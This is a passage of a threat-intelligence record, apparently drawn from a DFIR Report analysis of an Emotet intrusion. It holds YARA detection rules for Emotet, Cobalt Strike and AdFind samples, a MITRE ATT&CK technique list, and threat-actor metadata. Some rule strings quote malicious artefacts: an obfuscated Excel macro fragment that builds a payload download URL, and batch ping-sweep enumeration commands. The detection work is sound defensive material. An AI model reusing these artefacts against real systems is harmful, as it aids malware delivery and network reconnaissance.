= \"lw7\\\"668!qZNL_EIS7IiMa\" fullword ascii\n\n   $s12 = \"IS6\\\\JMtdHh0Piw2/PuH\" fullword ascii\n\n   $s13 = \"iw#!RuF%OR__*^$nw76668!qZNL_EYS7I\" fullword ascii\n\n   $s14 = \".RuF%LR__*^$\" fullword ascii\n\n   $s15 = \"^<_EHJ3IPLPeZX0Phg7!BAK%_\" fullword ascii\n\n   $s16 = \"ilG8Rn\\\"2OIkY*E%zw'v669(pZGn_EH_6IE\" fullword ascii\n\n   $s17 = \"ilg7Rnr0OI^]*JTnw6\\\"76<\" fullword ascii\n\n   $s18 = \"Broken pipe\" fullword ascii /* Goodware String - occured 742 times */\n\n   $s19 = \"Permission denied\" fullword ascii /* Goodware String - occured 823 times */\n\n   $s20 = \"v)(Ro\\\">OHkU*D%xw9\" fullword ascii\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 3000KB and\n\n   ( pe.imphash() == \"066c972d2129d0e167d371a0abfcf03b\" and ( pe.exports(\"YAeJyEAYL7F4eDck6YUaf\") and\npe.exports(\"fmFkmnQYB5TC2Sq5NGFkK\") and pe.exports(\"nrDjhnkd9nedaQwcCY\") ) or 12 of them )\n\n}\n\n\nrule UOmCgbXygCe_14335 {\n\n  meta:\n\n   description = \"UOmCgbXygCe.exe\"\n\n   author = \"The DFIR Report\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-09-12\"\n\n   hash1 = \"f4c085ef1ba7e78a17a9185e4d5e06163fe0e39b6b0dc3088b4c1ed11c0d726b\"\n  strings:\n\n   $s1 = \"runsuite.log\" fullword ascii\n\n   $s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n\n   $s3 = \"f73.exe\" fullword ascii\n\n   $s4 = \"Processing test line %ld %s leaked %d\" fullword ascii\n\n   $s5 = \"Internal error: xmlSchemaTypeFixup, complex type '%s': the <simpleContent><restriction> is missing a\n<simpleType> child, but was\" ascii\n\n   $s6 = \"The target namespace of the included/redefined schema '%s' has to be absent or the same as the\nincluding/redefining schema's tar\" ascii\n\n   $s7 = \"The target namespace of the included/redefined schema '%s' has to be absent, since the including/redefining\nschema has no target\" ascii\n\n   $s8 = \"A <simpleType> is expected among the children of <restriction>, if <simpleContent> is used and the base\ntype '%s' is a complex t\" ascii\n\n   $s9 = \"there is at least one entity reference in the node-tree currently being validated. Processing of entities\nwith this XML Schema p\" ascii\n\n   $s10 = \"## %s test suite for Schemas version %s\" fullword ascii\n\n```\n\n-----\n\n```\n   $s12 = \"If <simpleContent> and <restriction> is used, the base type must be a simple type or a complex type with\nmixed content and parti\" ascii\n\n   $s13 = \"For a string to be a valid default, the type definition must be a simple type or a complex type with\nsimple content or mixed con\" ascii\n\n   $s14 = \"For a string to be a valid default, the type definition must be a simple type or a complex type with mixed\ncontent and a particl\" ascii\n\n   $s15 = \"Could not open the log file, running in verbose mode\" fullword ascii\n\n   $s16 = \"not validating will not read content for PE entity %s\" fullword ascii\n\n   $s17 = \"Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already\nimported with the schema loca\" ascii\n\n   $s18 = \"(annotation?, (simpleContent | complexContent | ((group | all | choice | sequence)?, ((attribute |\nattributeGroup)*, anyAttribut\" ascii\n\n   $s19 = \"get namespace\" fullword ascii\n\n   $s20 = \"instance %s fails to parse\" fullword ascii\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 7000KB and\n\n   ( pe.imphash() == \"bcf185f1308ffd9e4249849d206d9d0c\" and pe.exports(\"xmlEscapeFormatString\") or 12 of them )\n\n}\n\n\nrule info_1805_14335 {\n\n  meta:\n\n   description = \"info_1805.xls\"\n\n   author = \"The DFIR Report\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-09-12\"\n\n   hash1 = \"e598b9700e13f2cb1c30c6d9230152ed5716a6d6e25db702576fefeb6638005e\"\n  strings:\n\n   $s1 = \"32.exe\" fullword ascii\n\n   $s2 = \"System32\\\\X\" fullword ascii\n\n   $s3 = \"DocumentOwnerPassword\" fullword wide\n\n   $s4 = \"DocumentUserPassword\" fullword wide\n\n   $s5 = \"t\\\"&\\\"t\\\"&\\\"p\\\"&\\\"s:\\\"&\\\"//lo\\\"&\\\"pe\\\"&\\\"sp\\\"&\\\"ub\\\"&\\\"li\\\"&\\\"ci\\\"&\\\"da\\\"&\\\"de.c\\\"&\\\"o\\\"&\\\"m/cgibin/e\\\"&\\\"5R\\\"&\\\"5o\\\"&\\\"G4\\\"&\\\"\" ascii\n\n   $s6 = \"UniresDLL\" fullword ascii\n\n   $s7 = \"OEOGAJPGJPAG\" fullword ascii\n\n   $s8 = \"\\\\Windows\\\\\" fullword ascii\n\n   $s9 = \"_-* #,##0.00_-;\\\\-* #,##0.00_-;_-* \\\"-\\\"??_-;[email protected]_-\" fullword ascii\n\n   $s10 = \"_-* #,##0_-;\\\\-* #,##0_-;_-* \\\"-\\\"_-;[email protected]_-\" fullword ascii\n\n   $s11 = \"_-;_-* \\\"\" fullword ascii\n\n   $s12 = \"^{)P -z)\" fullword ascii\n\n   $s13 = \"ResOption1\" fullword ascii\n\n   $s14 = \"DocumentSummaryInformation\" fullword wide /* Goodware String - occured 41 times */\n\n   $s15 = \"Root Entry\" fullword wide /* Goodware String - occured 46 times */\n   $s16 = \"SummaryInformation\" fullword wide /* Goodware String - occured 50 times */\n\n   $s17 = \"A\\\",\\\"JJCCBB\\\"\" fullword ascii\n\n   $s18 = \"Excel 4.0\" fullword ascii\n\n   $s19 = \"Microsoft Print to PDF\" fullword wide\n\n   $s20 = \"\\\"_-;\\\\-* #,##0.00\\\\ \\\"\" fullword wide /* Goodware String - occured 1 times */\n\n  condition:\n\n   uint16(0) == 0xcfd0 and filesize < 200KB and\n\n   all of them\n\n}\n\n\nrule cobalt_strike_14435_dll_1 {\n\n  meta:\n\n   description = \"1.dll\"\n\n   author = \"The DFIR Report\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-09-12\"\n\n   hash1 = \"1b9c9e4ed6dab822b36e3716b1e8f046e92546554dff9bdbd18c822e18ab226b\"\n  strings:\n\n   $s1 = \"curity><requestedPrivileges><requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\">\n</requestedExecutionLevel></requeste\" ascii\n\n   $s2 = \"CDNS Project.dll\" fullword ascii\n\n   $s3 = \"hemas.microsoft.com/SMI/2005/WindowsSettings\\\">true</dpiAware></windowsSettings></application></assembly>\"\nfullword ascii\n\n   $s4 = \"Hostname to lookup:\" fullword wide\n\n   $s5 = \"Hostnames:\" fullword wide\n\n   $s6 = \"wOshV- D3\\\"[email protected] \\\\\" fullword ascii\n\n```\n\n-----\n\n```\n   $s8 = \"CDNS Project Version 1.0\" fullword wide\n\n   $s9 = \"zK$%S.cPO>rtW\" fullword ascii\n\n   $s10 = \"vOsh.HSDiXRI\" fullword ascii\n\n   $s11 = \"l4p.oZewOsh7zP\" fullword ascii\n\n   $s12 = \"5p2o.ewOsh7H\" fullword ascii\n\n   $s13 = \"h7H.DiX\" fullword ascii\n\n   $s14 = \"l4pWo.ewOsh[H%DiXRI\" fullword ascii\n\n   $s15 = \"rEWS).lpp~o\" fullword ascii\n\n   $s16 = \",m}_lOG\" fullword ascii\n\n   $s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo\nxmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii\n\n   $s18 = \"vileges></security></trustInfo><application xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings>\n<dpiAware xmlns=\\\"http:/\" ascii\n\n   $s19 = \"tn9- 2\" fullword ascii\n\n   $s20 = \"PDiXRI7\" fullword ascii\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 8000KB and\n\n   ( pe.imphash() == \"d1aef4e37a548a43a95d44bd2f8c0afc\" or 8 of them )\n\n}\n\n\nrule cobalt_strike_14435_dll_2 {\n\n  meta:\n\n   description = \"32.dll\"\n\n   author = \"The DFIR Report\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-09-12\"\n\n   hash1 = \"76bfb4a73dc0d3f382d3877a83ce62b50828f713744659bb21c30569d368caf8\"\n  strings:\n\n   $x1 = \"mail glide drooping dismiss collation production mm refresh murderer start parade subscription accident\nretorted carter stalls r\" ascii\n\n   $s2 = \"vlu405yd87.dll\" fullword ascii\n\n   $s3 = \"XYVZSWWVU\" fullword ascii /* base64 encoded string 'aVRYeT' */\n\n   $s4 = \"ZYWVWSXVT\" fullword ascii /* base64 encoded string 'aeVIuS' */\n\n   $s5 = \"WXVZTVVUVX\" fullword ascii /* base64 encoded string 'YuYMUTU' */\n\n   $s6 = \"ZYXZXSWZW\" fullword ascii /* base64 encoded string 'avWIfV' */\n\n   $s7 = \"SZWVSZTVU\" fullword ascii /* base64 encoded string 'eeRe5T' */\n\n   $s8 = \"VXVWUWVZYY\" fullword ascii /* base64 encoded string 'UuVQeYa' */\n\n   $s9 = \"VSXZZYSVU\" fullword ascii /* base64 encoded string 'IvYa%T' */\n\n   $s10 = \"VXUZUVWVU\" fullword ascii /* base64 encoded string ']FTUeT' */\n\n   $s11 = \"SVVZZXZUVW\" fullword ascii /* base64 encoded string 'IUYevTU' */\n\n   $s12 = \"USVZVSWVZ\" fullword ascii /* base64 encoded string 'IVUIeY' */\n\n   $s13 = \"SWVVTVSVWWXZZVVV\" fullword ascii /* base64 encoded string 'YUSU%VYvYUU' */\n\n   $s14 = \"VSXVUXXZS\" fullword ascii /* base64 encoded string 'IuT]vR' */\n\n   $s15 = \"WSVZYWZWWW\" fullword ascii /* base64 encoded string 'Y%YafVY' */\n\n   $s16 = \"XUSZXXVVW\" fullword ascii /* base64 encoded string 'Q&W]UV' */\n\n   $s17 = \"ZWZWZVZWWWZ\" fullword ascii /* base64 encoded string 'efVeVVYf' */\n   $s18 = \"STZVYVVZYS\" fullword ascii /* base64 encoded string 'I6UaUYa' */\n\n   $s19 = \"ZWZWYSZXUZ\" fullword ascii /* base64 encoded string 'efVa&WQ' */\n\n   $s20 = \"SVVWWVVVWW\" fullword ascii /* base64 encoded string 'IUVYUUY' */\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 2000KB and\n\n   ( pe.imphash() == \"4e03b8b675969416fb0d10e8ab11f7c2\" or ( 1 of ($x*) or 12 of them ) )\n\n}\n\n\nrule find_bat_14335 {\n\n     meta:\n\n          description = \"Find.bat using AdFind\"\n\n          author = \"The DFIR Report\"\n\n          reference = \"https://thedfirreport.com\"\n\n          date = \"2022-09-12\"\n\n          hash1 = \"5bc00ad792d4ddac7d8568f98a717caff9d5ef389ed355a15b892cc10ab2887b\"\n\n     strings:\n\n          $x1 = \"find.exe\" nocase wide ascii\n\n          $s1 = \"objectcategory\" nocase wide ascii\n\n          $s2 = \"person\" nocase wide ascii\n\n          $s3 = \"computer\" nocase wide ascii\n\n          $s4 = \"organizationalUnit\" nocase wide ascii\n\n          $s5 = \"trustdmp\" nocase wide ascii\n\n```\n\n-----\n\n```\n          filesize < 1000\n\n          and 1 of ($x*)\n\n          and 4 of ($s*)\n\n}\n\n\nrule adfind_14335 {\n\n  meta:\n\n    description = \"Find.bat using AdFind\"\n\n       author = \"The DFIR Report\"\n\n          reference = \"https://thedfirreport.com\"\n\n          date = \"2022-09-12\"\n\n    hash1 = \"b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682\"\n\n\n  strings:\n\n    $x1 = \"joeware.net\" nocase wide ascii\n\n          $s1 = \"xx.cpp\" nocase wide ascii\n\n          $s2 = \"xxtype.cpp\" nocase wide ascii\n\n          $s3 = \"Joe Richards\" nocase wide ascii\n\n          $s4 = \"RFC 2253\" nocase wide ascii\n\n          $s5 = \"RFC 2254\" nocase wide ascii\n\n condition:\n\n   uint16(0) == 0x5a4d and filesize < 2000KB\n\n   and 1 of ($x*)\n\n      or 4 of ($s*)\n\n}\n\n\nrule p_bat_14335 {\n\n  meta:\n\n    description = \"Finding bat files that is used for enumeration\"\n\n       author = \"The DFIR Report\"\n\n          reference = \"https://thedfirreport.com\"\n\n          date = \"2022-09-12\" \n\n\n  strings:\n\n          $a1 = \"for /f %%i in\" nocase wide ascii\n\n          $a2 = \"do ping %%i\" nocase wide ascii\n\n          $a3 = \"-n 1 >>\" nocase wide ascii\n\n          $a4 = \"res.txt\" nocase wide ascii\n condition:\n\n   filesize < 2000KB\n\n   and all of ($a*)\n}\n\n## MITRE\n\n```\n\n-----\n\n```\nComponent Object Model - T1559.001\n\nPowerShell - T1059.001\n\nRegsvr32 - T1218.010\n\nPass the Hash - T1550.002\n\nDomain Groups - T1069.002\n\nDomain Account - T1087.002\n\nDomain Trust Discovery - T1482\n\nMalicious File - T1204.002\n\nSMB/Windows Admin Shares - T1021.002\n\nLateral Tool Transfer - T1570\n\nProcess Injection - T1055\n\nExfiltration to Cloud Storage - T1567.002\n\nThread Execution Hijacking - T1055.003\n\nRemote System Discovery - T1018\n\nSystem Information Discovery - T1082\n\nApplication Layer Protocol - T1071\n\nNetwork Share Discovery - T1135\n\nKerberoasting - T1558.003\n\nLSASS Memory - T1003.001\n\nRegistry Run Keys / Startup Folder - T1547.001\n\nPhishing - T1566\n\nSpearphishing Attachment - T1566.001\n\n#### Internal case #14335\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-12 - Dead or Alive- An Emotet Story.pdf"
    ],
    "report_names": [
        "2022-09-12 - Dead or Alive- An Emotet Story.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c5f79f58-db78-4cd7-88cf-c029a2199360",
            "created_at": "2022-10-25T16:07:23.325227Z",
            "updated_at": "2025-03-27T02:02:09.738383Z",
            "deleted_at": null,
            "main_name": "APT 12",
            "aliases": [
                "APT 12",
                "BeeBus",
                "Bronze Globe",
                "CTG-8223",
                "Calc Team",
                "Crimson Iron",
                "DNSCalc",
                "DynCALC",
                "Group 22",
                "Numbered Panda"
            ],
            "source_name": "ETDA:APT 12",
            "tools": [
                "AUMLIB",
                "ETUMBOT",
                "Exploz",
                "Graftor",
                "HIGHTIDE",
                "IHEATE",
                "IXESHE",
                "RIPTIDE",
                "RapidStealer",
                "Specfix",
                "THREEBYTE",
                "bbsinfo",
                "mswab",
                "yayih"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536064,
    "ts_updated_at": 1743041611,
    "ts_creation_date": 1664712103,
    "ts_modification_date": 1664712103,
    "files": {
        "pdf": "https://archive.orkl.eu/993d01337331343cb8242997fa36edaeb47da012.pdf",
        "text": "https://archive.orkl.eu/993d01337331343cb8242997fa36edaeb47da012.txt",
        "img": "https://archive.orkl.eu/993d01337331343cb8242997fa36edaeb47da012.jpg"
    }
}